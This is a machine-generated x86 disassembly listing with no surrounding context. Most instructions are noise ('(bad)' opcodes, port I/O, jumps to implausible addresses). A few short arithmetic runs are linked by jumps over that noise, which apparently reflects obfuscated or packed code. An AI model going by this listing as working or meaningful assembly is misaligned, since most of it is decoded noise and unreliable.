  415929:	mov    ds:0xe83471cd,eax
  41592e:	inc    ebx
  41592f:	fs jmp 0x415954
  415932:	(bad)  
  415933:	popf   
  415934:	dec    edi
  415935:	or     eax,0xf497b8fa
  41593a:	test   eax,0xd1e7f994
  41593f:	mov    dh,0x90
  415941:	jp     0x4159a8
  415943:	inc    edi
  415944:	test   BYTE PTR [ebx-0x29ff5d68],dh
  41594a:	test   DWORD PTR [ebx+0x6e04490a],ecx
  415950:	ret    0x32ab
  415953:	icebp  
  415954:	inc    ebx
  415955:	ficom  DWORD PTR [edi-0x39]
  415958:	or     DWORD PTR [ebp+0x5d],edi
  41595b:	shr    DWORD PTR ds:0xcae62c5,cl
  415961:	and    bh,BYTE PTR [eax+0x7fa371ac]
  415967:	pop    ds
  415968:	jae    0x4158f1
  41596a:	icebp  
  41596b:	sub    al,0x69
  41596d:	loope  0x415988
  41596f:	loopne 0x415947
  415971:	stc    
  415972:	pop    eax
  415973:	pop    esp
  415974:	loopne 0x415912
  415976:	sub    dh,bl
  415978:	(bad)  
  415979:	lea    ebp,[ecx+0x45f60cf3]
  41597f:	sub    al,0xc6
  415981:	pushf  
  415982:	push   ss
  415983:	dec    esp
  415984:	push   esi
  415985:	jne    0x415920
  415987:	std    
  415988:	aad    0xfb
  41598a:	mov    bh,0x9b
  41598c:	fwait
  41598d:	adc    bh,BYTE PTR [ebp+0x2971a45f]
  415993:	out    dx,al
  415994:	sub    al,0x19
  415996:	jns    0x4159d7
  415998:	dec    ecx
  415999:	pop    esi
  41599a:	inc    ebx
  41599b:	int    0x10
  41599d:	adc    eax,0x1bd8eb03
  4159a2:	adc    al,0x18
  4159a4:	js     0x415a0c
  4159a6:	pushf  
  4159a7:	fisttp WORD PTR [eax]
  4159a9:	mov    al,ds:0x49c55faa
  4159ae:	stos   BYTE PTR es:[edi],al
  4159af:	stos   DWORD PTR es:[edi],eax
  4159b0:	pop    eax
  4159b1:	inc    edx
  4159b2:	inc    edi
  4159b3:	fwait
  4159b4:	cmp    al,BYTE PTR [ebx+0x2b]
  4159b7:	xchg   edx,eax
  4159b8:	ror    ecx,1
  4159ba:	fisub  DWORD PTR [edx-0x3b]
  4159bd:	sub    BYTE PTR [ebx+esi*4+0x21b3b98b],al
  4159c4:	(bad)  
  4159c5:	imul   esi,ebx,0x5b
  4159c8:	inc    ebp
  4159c9:	repz pusha 
  4159cb:	ja     0x415a09
  4159cd:	jle    0x415a02
  4159cf:	dec    eax
  4159d0:	int3   
  4159d1:	inc    eax
  4159d2:	cs xchg al,ch
  4159d5:	push   es
  4159d6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4159d8:	enter  0xa131,0xf1
  4159dc:	adc    eax,0x854f1515
  4159e1:	xchg   esi,eax
  4159e2:	or     eax,DWORD PTR [ebp+0x2ea171d2]
  4159e8:	(bad)  
  4159e9:	imul   BYTE PTR [ecx+edx*4+0x48c9b068]
  4159f0:	(bad)  
  4159f2:	push   ss
  4159f3:	jns    0x41597a
  4159f5:	jno    0x4159af
  4159f7:	jno    0x4159ab
  4159f9:	push   edi
  4159fa:	mov    eax,0x10326bd
  4159ff:	imul   eax,DWORD PTR [edx],0xffffffb9
  415a02:	xchg   BYTE PTR [eax+0x156981ef],al
  415a08:	bnd ret 
  415a0a:	inc    ebx
  415a0b:	stos   DWORD PTR es:[edi],eax
  415a0c:	(bad)  
  415a0d:	hlt    
  415a0e:	jg     0x4159cc
  415a10:	add    eax,0x51432109
  415a15:	push   ebx
  415a16:	lahf   
  415a17:	dec    edi
  415a18:	jg     0x415a2c
  415a1a:	rcr    esp,0x9a
  415a1d:	dec    edi
  415a1e:	ss cmovnp esp,edi
  415a22:	cmp    BYTE PTR [esi+0x1d1d65a1],ah
  415a28:	sub    dh,BYTE PTR [ebp+edx*2+0x1d0d0208]
  415a2f:	jno    0x4159cb
  415a31:	outs   dx,BYTE PTR ds:[esi]
  415a32:	neg    BYTE PTR [ebx+0x7d]
  415a35:	stos   DWORD PTR es:[edi],eax
  415a36:	fucomi st,st(2)
  415a38:	js     0x4159bb
  415a3a:	imul   edi,DWORD PTR [ecx+0x4],0xa1ca8671
  415a41:	dec    edx
  415a42:	ins    DWORD PTR es:[edi],dx
  415a43:	out    dx,eax
  415a44:	jl     0x415a96
  415a46:	mov    edx,0xf2a187ea
  415a4b:	shr    DWORD PTR [edx+0x25],1
  415a4e:	sub    DWORD PTR [esi-0x38],0x4e11c282
  415a55:	cld    
  415a56:	(bad)  
  415a57:	xchg   ebx,eax
  415a58:	mov    al,ds:0x986a9479
  415a5d:	cwde   
  415a5e:	mov    ch,0x5b
  415a60:	push   ebp
  415a61:	inc    esi
  415a62:	es jmp 0x20e29c3
  415a68:	mov    eax,0x7edf503e
  415a6d:	cmc    
  415a6e:	pop    ebx
  415a6f:	arpl   WORD PTR [edi+0x32e28585],dx
  415a75:	in     al,0x9
  415a77:	inc    ecx
  415a78:	sub    eax,0x9815a1a5
  415a7d:	lods   eax,DWORD PTR ds:[esi]
  415a7e:	cld    
  415a7f:	add    edx,DWORD PTR [eax-0x7a]
  415a82:	or     ecx,DWORD PTR [edi-0x7a181e22]
  415a88:	cdq    
  415a89:	hlt    
  415a8a:	xor    edx,ecx
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	mov    ebp,0xb84e2a49
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	inc    ebp
  415ab1:	jmp    0x7f05:0x4c5e978e
  415ab8:	cld    
  415ab9:	stc    
  415aba:	or     al,0xf
  415abc:	add    DWORD PTR [ebp+0x3b820bd9],ecx
  415ac2:	adc    al,0x63
  415ac4:	pop    es
  415ac5:	jae    0x415b35
  415ac7:	and    al,0x26
  415ac9:	jbe    0x415ade
  415acb:	jle    0x415b1e
  415acd:	nop
  415ace:	ins    DWORD PTR es:[edi],dx
  415acf:	pop    ds
  415ad0:	add    al,0x67
  415ad2:	sar    WORD PTR [edx],0x10
  415ad6:	add    DWORD PTR [edx-0xc581464],0xffffffa9
  415add:	lods   eax,DWORD PTR ds:[esi]
  415ade:	(bad)  [ebx+0x21f2284d]
  415ae4:	or     al,BYTE PTR [ecx]
  415ae6:	adc    DWORD PTR ds:0x19775270,0x6c
  415aed:	fidivr WORD PTR [ebx-0x1ee30729]
  415af3:	fbld   TBYTE PTR [esi+edi*1]
  415af6:	ins    DWORD PTR es:[edi],dx
  415af7:	jmp    ecx
  415af9:	ret    0x63f4
  415afc:	or     DWORD PTR [ebx-0x62],0x57
  415b00:	xchg   ebp,eax
  415b01:	cmp    eax,edi
  415b03:	sub    dl,dh
  415b05:	mov    dh,0x57
  415b07:	pop    edx
  415b08:	jp     0x415b69
  415b0a:	inc    esi
  415b0b:	daa    
  415b0c:	jae    0x415b17
  415b0e:	fisub  WORD PTR [ebx+0xc]
  415b11:	sbb    eax,0xda2c0751
  415b16:	xchg   edx,eax
  415b17:	ss retf 0xf946
  415b1b:	cmc    
  415b1c:	inc    edi
  415b1d:	push   ds
  415b1e:	adc    al,0xd
  415b20:	add    eax,0x1556a0af
  415b25:	inc    ebp
  415b26:	add    edi,DWORD PTR [edx+0x4bad9e07]
  415b2c:	xchg   DWORD PTR [eax+0x7fd8b070],ecx
  415b32:	sahf   
  415b33:	mov    ds:0xa116e84b,eax
  415b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b39:	add    bh,BYTE PTR [ebp-0x50f6d68a]
  415b3f:	mov    eax,ds:0xcf1980ab
  415b44:	inc    edx
  415b45:	sbb    ecx,DWORD PTR [ecx-0x308efc22]
  415b4b:	stc    
  415b4c:	mov    dh,0xfe
  415b4e:	dec    eax
  415b4f:	aad    0xc7
  415b51:	lock ret 
  415b53:	cmp    ch,BYTE PTR [ebx]
  415b55:	add    edx,eax
  415b57:	mov    DWORD PTR [edi-0x21c71fa0],edx
  415b5d:	adc    edi,DWORD PTR [edx-0x1237faea]
  415b63:	lods   eax,DWORD PTR ds:[esi]
  415b64:	inc    ebp
  415b65:	push   esi
  415b66:	enter  0x5d3e,0x85
  415b6a:	ja     0x415b51
  415b6c:	xchg   esp,eax
  415b6d:	pop    esp
  415b6e:	xor    DWORD PTR [ecx+edx*1],esp
  415b71:	xchg   BYTE PTR [ecx+0x3af283ae],dl
  415b77:	xor    cl,BYTE PTR ds:[esi]
  415b7a:	in     al,0x34
  415b7c:	rcl    DWORD PTR [edi+0x28750770],1
  415b82:	inc    esp
  415b83:	xchg   ebp,eax
  415b84:	repnz adc DWORD PTR [ecx-0x70],esi
  415b88:	add    ch,bl
  415b8a:	cmp    ah,BYTE PTR [esi-0x1f4f982b]
  415b90:	cmp    eax,0x92b75c92
  415b95:	mov    BYTE PTR [ebx],0x9c
  415b98:	dec    ebp
  415b99:	les    edx,FWORD PTR [esi+0x67eb250a]
  415b9f:	cmc    
  415ba0:	hlt    
  415ba1:	pop    edi
  415ba2:	stc    
  415ba3:	adc    esi,DWORD PTR [ecx+edi*2+0x335dd1f1]
  415baa:	add    DWORD PTR [ebp+0x560c448c],edi
  415bb0:	push   ecx
  415bb1:	ret    0x18a6
  415bb4:	pop    edx
  415bb5:	or     ebp,DWORD PTR [edx+eax*1+0x7e]
  415bb9:	push   es
  415bba:	mov    ch,0x30
  415bbc:	jmp    0xb40cd6e0
  415bc1:	lods   al,BYTE PTR ds:[esi]
  415bc2:	ficom  DWORD PTR [ebx+0x6f]
  415bc5:	in     eax,0x94
  415bc7:	in     al,0x42
  415bc9:	pushf  
  415bca:	and    ecx,ebx
  415bcc:	mov    ebp,ebp
  415bce:	in     eax,0x20
  415bd0:	jae    0x415b54
  415bd2:	scas   al,BYTE PTR es:[edi]
  415bd3:	xchg   edx,eax
  415bd4:	imul   BYTE PTR [ebx+0x87f80c1]
  415bda:	or     ah,BYTE PTR [ebx-0x5494e83d]
  415be0:	std    
  415be1:	ja     0x415bc6
  415be3:	and    esi,DWORD PTR [ebp-0x1f83e03e]
  415be9:	pop    edi
  415bea:	daa    
  415beb:	fimul  WORD PTR [edx+0x2aab8818]
  415bf1:	call   0x59f49116
  415bf6:	pop    ds
  415bf7:	jecxz  0x415c40
  415bf9:	cwde   
  415bfa:	(bad)  
  415bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bfc:	pop    ds
  415bfd:	pop    edi
  415bfe:	adc    al,bl
  415c00:	pushf  
  415c01:	in     al,dx
  415c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c03:	fcom   QWORD PTR [edi+0x4c4055e6]
  415c09:	sbb    eax,0xfb1ea9a6
  415c0e:	mov    bl,0x36
  415c10:	imul   edx,DWORD PTR [esi+0x5f5a17dd],0xffffffb3
  415c17:	mov    ds,WORD PTR [esi+0x335f7712]
  415c1d:	int    0x30
  415c1f:	push   ecx
  415c20:	dec    ecx
  415c21:	and    al,0x41
  415c23:	je     0x415bf5
  415c25:	jecxz  0x415c77
  415c27:	mov    eax,ds:0xbeb60175
  415c2c:	cmc    
  415c2d:	clc    
  415c2e:	sub    esi,DWORD PTR [edi-0x4f]
  415c31:	push   ss
  415c32:	gs push edi
  415c34:	out    0x2e,eax
  415c36:	ds add al,0x4d
  415c39:	xor    eax,0x7f087f83
  415c3e:	pop    edi
  415c3f:	push   es
  415c40:	and    edx,edi
  415c42:	inc    ebp
  415c43:	dec    ecx
  415c44:	and    ecx,DWORD PTR [edx+0x1b966e3a]
  415c4a:	test   eax,0x39159380
  415c4f:	pop    ecx
  415c50:	lds    edx,FWORD PTR [esi]
  415c52:	gs inc ecx
  415c54:	addr16 ja 0x415c38
  415c57:	cmp    ebp,ecx
  415c59:	push   ebp
  415c5a:	mov    esi,0xa7e31c9a
  415c5f:	cdq    
  415c60:	mov    ebp,edi
  415c62:	pop    ss
  415c63:	sub    eax,0x4d171174
  415c68:	mov    WORD PTR [ecx+0x60d0637],ss
  415c6e:	sub    BYTE PTR [ecx+0x213af4a3],dh
  415c74:	xchg   esi,eax
  415c75:	inc    esp
  415c76:	cmp    BYTE PTR [ebx-0x2e],al
  415c79:	and    ecx,ebx
  415c7b:	and    DWORD PTR [ecx+0x1f],ebx
  415c7e:	enter  0x3b0c,0x9f
  415c82:	xchg   edi,eax
  415c83:	jle    0x415cca
  415c85:	aas    
  415c86:	fidiv  DWORD PTR [edi-0x51]
  415c89:	jecxz  0x415c64
  415c8b:	jns    0x415cdb
  415c8d:	out    dx,eax
  415c8e:	aad    0xd
  415c90:	in     al,0xf8
  415c92:	pop    ebx
  415c93:	ja     0x415c4b
  415c95:	ja     0x415cee
  415c97:	ss fwait
  415c99:	cwde   
  415c9a:	push   cs
  415c9b:	(bad)  
  415c9c:	fadd   QWORD PTR [ebx+0x45eed82b]
  415ca2:	inc    edi
  415ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca4:	xchg   dh,bl
  415ca6:	mov    edi,0x67ee61f9
  415cab:	(bad)  
  415cac:	nop
  415cad:	jl     0x415cf5
  415caf:	cdq    
  415cb0:	mov    ds:0xb28b7a1a,al
  415cb5:	les    esp,FWORD PTR [ebp-0x44]
  415cb8:	xchg   esi,eax
  415cb9:	or     al,ah
  415cbb:	shl    DWORD PTR ds:0xb963ab1f,0x4c
  415cc2:	bound  edx,QWORD PTR [edx-0x4]
  415cc5:	shr    dl,0xc5
  415cc8:	daa    
  415cc9:	push   0x780f76b1
  415cce:	xchg   edi,eax
  415ccf:	mov    ds:0xbeebad99,eax
  415cd4:	in     al,dx
  415cd5:	dec    edx
  415cd6:	(bad)  
  415cd7:	push   edx
  415cd8:	jnp    0x415cb6
  415cda:	iret   
  415cdb:	mov    ah,0x6e
  415cdd:	jns    0x415cab
  415cdf:	pop    edx
  415ce0:	and    esp,DWORD PTR [eax+ecx*8]
  415ce3:	mov    edx,0x6bd7bfbf
  415ce8:	xor    al,BYTE PTR [edx-0x3a6e644e]
  415cee:	nop
  415cef:	jecxz  0x415d18
  415cf1:	popa   
  415cf2:	mov    al,BYTE PTR [ebp+0x2e4ab684]
  415cf8:	ror    DWORD PTR [ecx+0x56],1
  415cfb:	xchg   ecx,eax
  415cfc:	and    al,0x9f
  415cfe:	fbstp  TBYTE PTR [edx+eiz*2+0x6ca21171]
  415d05:	pop    esp
  415d06:	cmp    al,BYTE PTR [ebp+eiz*2+0x2961d87d]
  415d0d:	sbb    ebx,eax
  415d0f:	xor    esi,DWORD PTR [esi+0x7d]
  415d12:	add    BYTE PTR [ebx-0x5424dfa3],bl
  415d18:	xor    eax,0x1ee5c799
  415d1d:	cli    
  415d1e:	cld    
  415d1f:	nop
  415d20:	pushf  
  415d21:	mov    DWORD PTR [edi-0x10],esi
  415d24:	adc    ch,BYTE PTR fs:[edi+esi*2-0x53]
  415d29:	rcr    DWORD PTR [ebp+0x5c4a7d8e],cl
  415d2f:	mov    ch,0x7c
  415d31:	xor    ch,BYTE PTR [ecx+0x60]
  415d34:	add    eax,0x21652f11
  415d39:	in     eax,0x57
  415d3b:	sub    BYTE PTR [edx+esi*2-0x43],0x66
  415d40:	out    0x4b,eax
  415d42:	retf   
  415d43:	stos   DWORD PTR es:[edi],eax
  415d44:	push   es
  415d45:	jnp    0x415cd1
  415d47:	and    bh,dl
  415d49:	sti    
  415d4a:	call   0xf787a244
  415d4f:	push   ecx
  415d50:	rcl    esi,0xa2
  415d53:	adc    eax,0x911483ad
  415d58:	jge    0x415db3
  415d5a:	imul   eax,edi,0x77a12cd8
  415d60:	inc    ecx
  415d61:	dec    ebx
  415d62:	xchg   DWORD PTR [ecx-0x1a],esi
  415d65:	out    dx,al
  415d66:	sbb    esp,edx
  415d68:	mov    al,ds:0xe2b4de29
  415d6d:	ret    
  415d6e:	data16 fmul QWORD PTR [edi+0x31b90b7a]
  415d75:	add    dh,dh
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	lahf   
  415d95:	cmp    DWORD PTR [eax+0x7f0a819b],esi
  415d9b:	jo     0x415d56
  415d9d:	jle    0x415e0f
  415d9f:	jo     0x415ddc
  415da1:	mov    dl,0x67
  415da3:	sbb    edi,DWORD PTR [ecx]
  415da5:	push   ss
  415da6:	mov    esp,0x31bd6a95
  415dab:	push   esi
  415dac:	and    ch,BYTE PTR ds:0x995bcbf
  415db2:	neg    dl
  415db4:	ins    DWORD PTR es:[edi],dx
  415db5:	pop    eax
  415db6:	pop    ebx
  415db7:	adc    eax,0x4e9e7bea
  415dbc:	cmp    esp,DWORD PTR [edi-0x791d5e4]
  415dc2:	jae    0x415e2c
  415dc4:	pop    esi
  415dc5:	ss mov edi,0xd972b0fd
  415dcb:	xchg   ecx,eax
  415dcc:	xchg   esi,eax
  415dcd:	mov    cl,0x19
  415dcf:	mov    bl,0x9a
  415dd1:	jle    0x415dd9
  415dd3:	aas    
  415dd4:	xchg   DWORD PTR [ebx],esi
  415dd6:	mov    dh,0x4a
  415dd8:	fs inc esi
  415dda:	cmp    ecx,ebx
  415ddc:	cmp    DWORD PTR [edx],eax
  415dde:	mov    ebx,0xca0838e
  415de3:	jle    0x415def
  415de5:	xchg   edi,eax
  415de6:	sbb    DWORD PTR [esp-0x1113f030],edi
  415ded:	sbb    al,0xc1
  415def:	pop    esi
  415df0:	(bad)  
  415df1:	jg     0x415da9
  415df3:	jmp    0x1075c89a
  415df8:	push   ebx
  415df9:	sbb    eax,0x1bfc626b
  415dfe:	xchg   ecx,eax
  415dff:	mov    bh,0x49
  415e01:	loop   0x415da8
  415e03:	xchg   esi,eax
  415e04:	addr16 pop ss
  415e06:	cs enter 0xa9e3,0xf3
  415e0b:	inc    esi
  415e0c:	cmp    BYTE PTR [edx-0x14a49be4],ah
  415e12:	dec    esi
  415e13:	dec    edx
  415e14:	pop    edx
  415e15:	push   ecx
  415e16:	std    
  415e17:	push   esi
  415e18:	jl     0x415e96
  415e1a:	push   esp
  415e1b:	dec    edx
  415e1c:	call   0x3fc2:0xd4a8c95c
  415e23:	jl     0x415e1f
  415e25:	cld    
  415e26:	std    
  415e27:	sbb    al,0x15
  415e29:	jne    0x415dd3
  415e2b:	dec    ebx
  415e2c:	sar    BYTE PTR [ecx+0x6a],0x31
  415e30:	jns    0x415e80
  415e32:	dec    edi
  415e33:	div    ebx
  415e35:	xor    BYTE PTR [edx+0x3669af63],bl
  415e3b:	out    dx,al
  415e3c:	les    edx,FWORD PTR [edx]
  415e3e:	fsub   QWORD PTR [edx]
  415e40:	sub    dh,bh
  415e42:	test   eax,0x66f41348
  415e47:	inc    esi
  415e48:	fldcw  WORD PTR [ebx-0x40]
  415e4b:	dec    ebp
  415e4c:	ds push esi
  415e4e:	xchg   edi,eax
  415e4f:	jecxz  0x415e4c
  415e51:	mov    BYTE PTR [edx+0xb774eed],dh
  415e57:	(bad)  
  415e59:	fwait
  415e5a:	ja     0x415e08
  415e5c:	adc    eax,0x40417253
  415e61:	dec    ecx
  415e62:	sti    
  415e63:	(bad)  
  415e65:	aas    
  415e66:	jg     0x415e4f
  415e68:	ja     0x415e1a
  415e6a:	push   ebp
  415e6b:	mov    dl,0x2e
  415e6d:	stc    
  415e6e:	adc    bl,BYTE PTR [ebx]
  415e70:	mov    edx,0x9ebdc2c5
  415e75:	stos   BYTE PTR es:[edi],al
  415e76:	mov    dh,0x20
  415e78:	jne    0x415edb
  415e7a:	pop    esi
  415e7b:	(bad)  
  415e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e7e:	scas   eax,DWORD PTR es:[edi]
  415e7f:	jbe    0x415e73
  415e81:	lahf   
  415e82:	neg    ebp
  415e84:	push   ecx
  415e85:	fs xor al,0xc6
  415e88:	xchg   edi,eax
  415e89:	and    BYTE PTR [edx+0x23494b03],bh
  415e8f:	mov    DWORD PTR [edx+0x47],esi
  415e92:	dec    eax
  415e93:	inc    eax
  415e94:	push   0xa0fb186e
  415e99:	cmp    eax,0x2023c9af
  415e9e:	mov    edi,0xe79a2bc3
  415ea3:	repz xchg esp,eax
  415ea5:	and    dh,ah
  415ea7:	cmp    esi,DWORD PTR [ebp-0x7c]
  415eaa:	iret   
  415eab:	scas   al,BYTE PTR es:[edi]
  415eac:	xchg   esi,eax
  415ead:	jns    0x415e5e
  415eaf:	mov    ecx,0x3207a4e0
  415eb4:	xchg   edx,eax
  415eb5:	fiadd  WORD PTR [esp+eiz*8+0x6c23a128]
  415ebc:	fist   WORD PTR [eax-0x26]
  415ebf:	mov    ch,0x95
  415ec1:	fisub  WORD PTR [ecx]
  415ec3:	mov    eax,DWORD PTR [ebx]
  415ec5:	and    edi,DWORD PTR [edi]
  415ec7:	in     eax,0xb9
  415ec9:	push   edi
  415eca:	test   al,0x6
  415ecc:	sbb    DWORD PTR [ebx-0x5c],edx
  415ecf:	dec    eax
  415ed0:	xchg   ecx,eax
  415ed1:	jecxz  0x415e88
  415ed3:	jle    0x415ee6
  415ed5:	or     bh,BYTE PTR [esi]
  415ed7:	fcmovu st,st(4)
  415ed9:	or     al,0x28
  415edb:	(bad)  
  415edc:	fisttp WORD PTR [ebx*2-0x7f27d0f0]
  415ee3:	mov    edi,eax
  415ee5:	pop    edi
  415ee6:	mov    al,ds:0x1ff25ec2
  415eeb:	mov    bh,0x6a
  415eed:	in     eax,0xf5
  415eef:	sbb    cl,BYTE PTR [edx]
  415ef1:	dec    ecx
  415ef2:	shl    DWORD PTR [ebx+0x2c5e68cd],0xa6
  415ef9:	xchg   DWORD PTR [edx+0x59],esp
  415efc:	cmp    BYTE PTR [edx],0xa9
  415eff:	adc    edi,ebx
  415f01:	shl    BYTE PTR [edi+edi*2-0x80],1
  415f05:	lods   al,BYTE PTR ds:[si]
  415f07:	fdiv   DWORD PTR [edx+0x24]
  415f0a:	repz fldenv ds:0xc5ab5fc8
  415f11:	test   DWORD PTR [ebx+0x41141b49],esi
  415f17:	sub    eax,0xdf3f1595
  415f1c:	adc    al,0x25
  415f1e:	sub    ah,0xd5
  415f21:	test   al,0x73
  415f23:	adc    eax,0xdc7f1655
  415f28:	pop    esp
  415f29:	fisttp QWORD PTR [eax+0x1c]
  415f2c:	leave  
  415f2d:	inc    BYTE PTR [eax+0x7d1bddb7]
  415f33:	inc    ebp
  415f34:	cmc    
  415f35:	add    DWORD PTR [esi],esi
  415f37:	sub    eax,0x7271dc37
  415f3c:	arpl   WORD PTR [edi+0x723d4bcd],dx
  415f42:	out    0xe6,eax
  415f44:	nop
  415f45:	dec    edx
  415f46:	jbe    0x415fb2
  415f48:	cs push 0x6
  415f4b:	retf   
  415f4c:	shl    BYTE PTR [esp+ebx*2-0x8],cl
  415f50:	push   eax
  415f51:	inc    edi
  415f52:	cli    
  415f53:	cmp    dh,BYTE PTR [esi]
  415f55:	loopne 0x415f13
  415f57:	repnz loop 0x415fb0
  415f5a:	cmp    BYTE PTR cs:[esi],ah
  415f5d:	outs   dx,DWORD PTR ds:[esi]
  415f5e:	mov    bl,0x1f
  415f60:	sbb    eax,0x60451018
  415f65:	mov    ebp,DWORD PTR [ebx]
  415f67:	and    ebx,DWORD PTR [ecx-0x34]
  415f6a:	pusha  
  415f6b:	jge    0x415efe
  415f6d:	icebp  
  415f6e:	enter  0xb701,0xaa
  415f72:	retf   
  415f73:	mov    ebp,0xae18b74b
  415f78:	fimul  WORD PTR [edx-0x22]
  415f7b:	push   esi
  415f7c:	mov    ebp,0xc5d2b697
  415f81:	pop    ebx
  415f82:	pushf  
  415f83:	push   ecx
  415f84:	das    
  415f85:	int    0xa2
  415f87:	loopne 0x415f85
  415f89:	dec    esp
  415f8a:	or     eax,ecx
  415f8c:	aam    0x5c
  415f8e:	sbb    bl,ah
  415f90:	(bad)  
  415f91:	mov    edi,0x278193fe
  415f96:	xchg   edx,eax
  415f97:	jle    0x415f60
  415f99:	adc    eax,0x2b8e9668
  415f9e:	in     al,dx
  415f9f:	mov    ebp,0xa342b161
  415fa4:	test   BYTE PTR [edi+0x12],ch
  415fa7:	hlt    
  415fa8:	ins    DWORD PTR es:[edi],dx
  415fa9:	mov    ds:0x97bec18f,eax
  415fae:	push   0x6b53b6ce
  415fb3:	mov    esi,0x7dcb521a
  415fb8:	jg     0x415fe6
  415fba:	cmc    
  415fbb:	jo     0x415fd0
  415fbd:	rcr    DWORD PTR [ecx+0x64],0x22
  415fc1:	or     al,0x12
  415fc3:	mov    ss,WORD PTR [edi+ebp*1-0xa0fd642]
  415fca:	ret    0xe3f5
  415fcd:	mov    eax,DWORD PTR [edx-0x34ca1471]
  415fd3:	div    DWORD PTR [ebx+0x56]
  415fd6:	push   ds
  415fd7:	sbb    DWORD PTR [edi+0x5a954363],edx
  415fdd:	jnp    0x415f8a
  415fdf:	jno    0x415fd3
  415fe1:	jo     0x415fdf
  415fe3:	mov    edi,0x8bf4c460
  415fe8:	mov    cl,0x50
  415fea:	loop   0x416008
  415fec:	mov    dh,0x4
  415fee:	and    eax,0x18efd5c5
  415ff3:	adc    eax,0xdbcaedda
  415ff8:	xor    eax,0x643f0ad4
  415ffd:	mov    edx,0xc42f893e
  416002:	xor    edi,ecx
  416004:	and    al,0xf9
  416006:	and    bl,al
  416008:	cmp    eax,0x2731dda3
  41600d:	cld    
  41600e:	(bad)  
  41600f:	frstor [esi+0x6]
  416012:	cmp    edi,DWORD PTR [ecx]
  416014:	xchg   BYTE PTR [ebp-0x6e],ah
  416017:	inc    esi
  416018:	pusha  
  416019:	js     0x415fcd
  41601b:	lds    ecx,FWORD PTR [esi+0x31daecf7]
  416021:	inc    BYTE PTR [edx]
  416023:	cmp    al,0x4f
  416025:	jg     0x415fb6
  416027:	mov    esi,0x4e001462
  41602c:	stos   BYTE PTR es:[edi],al
  41602d:	test   al,0x96
  41602f:	mov    bl,0xc3
  416031:	add    DWORD PTR ds:0xde8a9b07,0x4f68843c
  41603b:	out    0x76,eax
  41603d:	jb     0x41605d
  41603f:	adc    bh,BYTE PTR [esi-0x3bdc2d2a]
  416045:	xchg   bl,dh
  416047:	inc    ecx
  416048:	and    al,0x27
  41604a:	push   esp
  41604b:	in     al,dx
  41604c:	ret    
  41604d:	fcom   st(0)
  41604f:	mov    edx,0xf30e6e2c
  416054:	mov    edx,0x17196aad
  416059:	mov    bl,0xdb
  41605b:	in     al,0xa1
  41605d:	out    0x3f,eax
  41605f:	test   DWORD PTR [ebx],eax
  416061:	adc    eax,0xf4cfa70f
  416066:	cwde   
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416106
  41609a:	add    edi,DWORD PTR [edx+0x7e]
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x4160a6
  4160a6:	mov    DWORD PTR [esi-0x6f785f09],edx
  4160ac:	xchg   edi,eax
  4160ad:	sbb    DWORD PTR [ebp-0x55],ecx
  4160b0:	cmp    ah,bl
  4160b2:	add    BYTE PTR [ecx],cl
  4160b4:	arpl   si,dx
  4160b6:	push   esp
  4160b7:	xor    eax,edx
  4160b9:	daa    
  4160ba:	mov    ch,0xd4
  4160bc:	mov    BYTE PTR [ebp+0x98c8ecf],bh
  4160c2:	in     eax,0xc1
  4160c4:	jmp    0x4160cc
  4160c6:	xor    ecx,DWORD PTR [esp+ecx*4-0x23]
  4160ca:	xchg   esi,eax
  4160cb:	dec    edi
  4160cc:	push   esi
  4160cd:	nop
  4160ce:	inc    eax
  4160cf:	jg     0x4160b4
  4160d1:	and    edx,DWORD PTR ds:[esi+0x51]
  4160d5:	fisttp WORD PTR [ebp+0x43]
  4160d8:	cmp    eax,ecx
  4160da:	jecxz  0x4160e3
  4160dc:	jno    0x416097
  4160de:	retf   
  4160df:	mov    cl,0xa9
  4160e1:	(bad)  
  4160e2:	shl    BYTE PTR [edi+eiz*8],1
  4160e5:	out    dx,eax
  4160e6:	(bad)  
  4160e8:	jae    0x4160eb
  4160ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160eb:	or     bh,al
  4160ed:	ins    BYTE PTR es:[edi],dx
  4160ee:	in     eax,0x73
  4160f0:	and    ebx,esi
  4160f2:	xlat   BYTE PTR ds:[ebx]
  4160f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160f4:	shl    edx,cl
  4160f6:	loopne 0x4160c7
  4160f8:	xchg   ebp,eax
  4160f9:	dec    edi
  4160fa:	in     al,dx
  4160fb:	retf   0xbb4c
  4160fe:	pop    ebp
  4160ff:	popf   
  416100:	call   0x989307dd
